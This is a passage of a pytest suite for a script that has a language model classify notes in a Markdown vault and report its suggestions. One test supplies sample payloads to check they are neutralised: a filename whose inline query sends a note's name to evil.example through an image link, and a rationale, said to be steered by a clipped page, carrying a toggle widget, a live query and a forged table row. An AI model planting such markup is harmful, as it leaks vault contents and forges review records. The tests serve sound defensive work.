    assert ("restricted material, NOT applied — the classification line cannot "
            "be read reliably; fix by hand") in rec["rationale"]
    assert p.read_bytes() == before


def test_oversized_frontmatter_is_refused(vault: Path):
    p = vault / "Knowledge" / "Big.md"
    p.write_text("---\ntitle: x\npad: " + "a" * (C.MAX_FRONTMATTER_CHARS + 1)
                 + "\n---\n\nbody\n", encoding="utf-8")
    client = FakeClient("confidential")
    rec = C.process_file(p, client, dry_run=False, detectors_only=False, force=False)
    assert rec is not None and rec["action"] == "error"
    assert rec["rationale"] == "frontmatter refused: larger than the cap"
    assert client.calls == []


def test_reject_still_works_on_a_note_with_a_duplicate_key(vault: Path):
    """A rejection writes no tier, so an unreadable declaration does not stop it."""
    p = vault / "Knowledge" / "Dup.md"
    p.write_text("---\nclassification: restricted\nclassification: public\n"
                 "classification_suggested: confidential\n"
                 "classification_reviewed: false\n---\n\nbody\n", encoding="utf-8")
    assert C.rule_on([p], "reject", None, dry_run=False)[0] == 1
    assert "classification: restricted\nclassification: public\n" in \
        p.read_text(encoding="utf-8")


# ---------------------------------------------------------------------------
# The run report is outside text too (M-DASH #32, #247).
# ---------------------------------------------------------------------------

def _report(vault: Path, monkeypatch: pytest.MonkeyPatch, records: list[dict]) -> str:
    report = vault / "Templates" / "Scripts" / "last-classification-review.md"
    report.parent.mkdir(parents=True, exist_ok=True)
    monkeypatch.setattr(C, "REPORT_FILE", report)
    C.write_report(records, len(records), dry_run=False)
    return report.read_text(encoding="utf-8")


def _rec(rel: str, rationale: str, confidence: str = "high") -> dict:
    return {"action": "suggested", "rel": rel, "title": Path(rel).stem,
            "from": "internal-use-only", "to": "confidential", "layer": "llm",
            "confidence": confidence, "rationale": rationale}


def test_report_renders_an_ordinary_row_as_before(vault: Path,
                                                  monkeypatch: pytest.MonkeyPatch):
    text = _report(vault, monkeypatch,
                   [_rec("Knowledge/Plain Note.md", "budget figures")])
    assert ("| [[Plain Note]] | internal-use-only | confidential | high "
            "| budget figures |") in text


def test_report_rationale_and_stem_cannot_plant_a_query_or_field(
        vault: Path, monkeypatch: pytest.MonkeyPatch):
    """An invitee's display name becomes a People/ filename and a clipped page
    steers the rationale: neither may reach the report as live markup."""
    import templater_guard
    stem = 'Eve]] `= "![](https://evil.example/"+[[Board Prep]].file.name+")"` [['
    rationale = ('see `INPUT[toggle:People/X.md#classification_reviewed]` and '
                 '`= [[Some Note]].classification` %% hide\n'
                 '| [[Forged]] | a | b | c | d |')
    text = _report(vault, monkeypatch, [
        _rec(f"People/{stem}.md", rationale, confidence="high` INPUT[x] |"),
        _rec("Knowledge/Z Later.md", "ok")])
    rows = [ln for ln in text.splitlines() if ln.startswith("|")]
    assert len(rows) == 4              # header, separator, two records
    assert not any("`" in row for row in rows)
    assert "INPUT[" not in text
    assert "[[Board Prep" not in text
    assert "[[Some Note" not in text
    assert "[[Forged" not in text
    assert "%%" not in text
    assert "[[Z Later]]" in text
    assert templater_guard.is_neutral(text)


# ---------------------------------------------------------------------------
# Tracking records only notes L1 adjudicated (M-DASH #35).
# ---------------------------------------------------------------------------

def _run(vault: Path, monkeypatch: pytest.MonkeyPatch, client, *extra: str) -> dict:
    import llm_endpoint
    monkeypatch.setattr(C, "TRACKING_FILE", vault / ".classification_tracking.json")
    # --vault re-points the report under Templates/Scripts; restore it after.
    monkeypatch.setattr(C, "REPORT_FILE", C.REPORT_FILE)
    (vault / "Templates" / "Scripts").mkdir(parents=True, exist_ok=True)
    monkeypatch.setattr(llm_endpoint, "client", lambda: client)
    monkeypatch.setattr(llm_endpoint, "describe", lambda: "fake")
    monkeypatch.setattr(C.sys, "argv", ["classify_notes.py", "--vault", str(vault),
                                        *extra])
    assert C.main() == 0
    return C.load_tracking()


def test_a_detectors_only_run_leaves_notes_for_the_model(
        vault: Path, monkeypatch: pytest.MonkeyPatch):
    write(vault, "Knowledge/A.md", "ordinary text", classification="internal-use-only")
    assert "Knowledge/A.md" not in _run(vault, monkeypatch, None, "--detectors-only")
    # ...so the next scheduled run still asks the model about it.
    client = FakeClient("confidential")
    _run(vault, monkeypatch, client)
    assert len(client.calls) == 1


def test_an_unreadable_verdict_is_not_tracked(vault: Path,
                                              monkeypatch: pytest.MonkeyPatch):
    write(vault, "Knowledge/A.md", "ordinary text", classification="internal-use-only")
    tracking = _run(vault, monkeypatch, FakeClient(raw="no json here"))
    assert "Knowledge/A.md" not in tracking
    report = (vault / "Templates" / "Scripts" / "last-classification-review.md"
              ).read_text(encoding="utf-8")
    assert "## Errors — 1" in report
    assert "unparseable model response" in report


def test_an_adjudicated_note_is_still_tracked(vault: Path,
                                              monkeypatch: pytest.MonkeyPatch):
    write(vault, "Knowledge/A.md", "ordinary text", classification="internal-use-only")
    assert "Knowledge/A.md" in _run(vault, monkeypatch, FakeClient("confidential"))
